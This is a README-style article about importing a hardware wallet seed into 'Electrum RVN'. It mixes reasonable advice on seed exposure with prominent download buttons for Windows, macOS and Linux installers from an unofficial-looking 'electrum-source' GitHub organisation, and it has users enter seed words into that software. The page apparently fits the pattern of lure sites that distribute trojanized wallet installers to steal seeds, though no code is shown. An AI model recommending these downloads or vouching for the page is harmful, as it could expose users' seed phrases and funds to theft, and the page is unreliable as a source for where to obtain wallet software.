![Electrum RVN](assets/banner-article.png)

# Importing a Hardware Wallet Seed into Electrum RVN

<!-- compact-download-block -->

<p align="center">Why a device seed should stay on the device</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Importing a hardware wallet's seed into Electrum RVN puts those keys on your computer, which is exactly what the device existed to prevent. The wallet allows it, and there are legitimate reasons to do it - but if the device still works, restoring onto a replacement device is the better answer.

## What the import actually does

A hardware wallet holds a seed and signs with it, so the seed never touches the computer. Importing that seed into software copies it out of the device's protection and into a wallet file on a general-purpose machine.

From that moment:

- the seed is on a disk, in an encrypted file, guarded by a password;
- malware on the machine can reach it in a way it could not reach the device;
- the device stops being the security boundary, because the same keys now exist outside it.

The balance does not change, and the addresses do not change - both come from the seed. What changes is where the keys live.

## Legitimate reasons to import

**The device is lost or destroyed** and the seed is the only copy of the keys. Importing is then a recovery step, not a way of life; move to a new device when you can.

**You are abandoning the device** and want the funds on a desktop wallet.

**The device's software no longer supports the coin**, and the seed is the only way to reach the funds.

**You are testing a backup** and want to confirm the phrase controls the addresses. Do it on a machine you trust, then remove the imported wallet.

## Reasons that are not good enough

- Convenience: the device is only mildly inconvenient to use.
- "Just to check the balance": a watch-only wallet does that without keys - [watch-only wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md).
- A tutorial told you to: most such tutorials are about recovering from a dead device.
- Someone in a chat suggested it: no legitimate support process needs your seed.

## The procedure, with the risks marked

1. **Use a machine you trust and can wipe.** This is the whole risk of the exercise. A clean install with no other wallets on it is the right host.
2. **Create a wallet by restoring**, not by importing a file. Choose the restore path and enter the seed words.
3. **Enter the words from the device's own backup**, not from a photograph or a chat message.
4. **Set a strong password** on the new wallet file. It is now the only barrier between the disk and the keys.
5. **Let it rescan**, then check the balance matches what the device showed.
6. **Choose the derivation path carefully.** A hardware wallet may have used a different path; if the balance is zero, switch paths before concluding anything - [zero balance after restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md).
7. **Wipe the device or keep it offline**, and decide deliberately whether the seed stays in software.

Step seven is the one people skip. An imported seed that is then left on a laptop while the device is reused elsewhere is one seed in two places with unequal protection.

## What to do afterwards

**If you imported to recover:** move the funds to a new wallet whose seed was generated by a working device or offline, then delete the imported wallet and its file. Recovery is a bridge, not a destination.

**If you imported deliberately:** accept that the device no longer adds security, keep the machine clean, and consider [cold storage](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md) instead - a workflow that keeps keys off networked machines without pretending a desktop file is a hardware wallet.

**Either way**, the seed is now the same seed in two places. Treat the paper as the authority and the file as a copy, and never let the two drift into different passwords and different assumptions.

## The alternative that keeps the device useful

Pair the device with the wallet instead of importing its seed. The wallet builds and broadcasts transactions, and the device signs them, with the keys never leaving it. That is what the device is for, and it is supported here - [pairing a Ledger with Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/pairing-a-ledger-with-electrum-rvn.md) and [using a Trezor with Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/using-a-trezor-with-electrum-rvn.md).

The difference is not cosmetic. Pairing keeps a hardware boundary; importing removes it and leaves a file.

## Recovering when the device is gone

This is the case that justifies the procedure. Order of operations: get the seed, restore on a trusted machine, confirm the balance, move the funds to a new wallet with a fresh seed, then destroy the old paper only once the new wallet is funded and tested.

Do not skip the "fresh seed" step. Reusing the seed of a lost device means the same keys exist on a device you no longer control, and nothing later fixes that. Exporting individual private keys is the related exposure to avoid entirely: the seed is the unit that matters here.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [Moving Electrum RVN to another computer](https://github.com/electrum-source/passphrase-backup/blob/main/moving-electrum-rvn-to-another-computer.md) is the safe way to transport a wallet afterwards, and [multisig wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/multisig-wallets-in-electrum-rvn.md) is the setup where one compromised machine is not enough to spend.

## FAQ

### Can I import a Ledger or Trezor seed into Electrum RVN?

Yes, through the restore path. It copies the keys into a software wallet, which ends the protection the device provided.

### Does importing change my addresses?

No. The addresses derive from the seed, so they are the same. What changes is where the private keys live.

### Is it safe if I only do it once?

"Once" is enough to put the seed on a disk. Whether that is acceptable depends on the machine and on whether you move the funds to a fresh seed afterwards.

### Will the balance show immediately?

After a rescan, usually - but check the derivation path if it does not, because hardware wallets do not always use the same one.

### Can I keep using the device afterwards?

You can, but it no longer adds protection: the same seed exists in software. Either move to a fresh seed on the device or accept the reduced boundary.

<!-- related-articles -->

## Related articles

- [Watch-Only Wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md)
- [Zero Balance After Restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md)
- [Electrum RVN Cold Storage Workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md)
- [Pairing a Ledger With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/pairing-a-ledger-with-electrum-rvn.md)
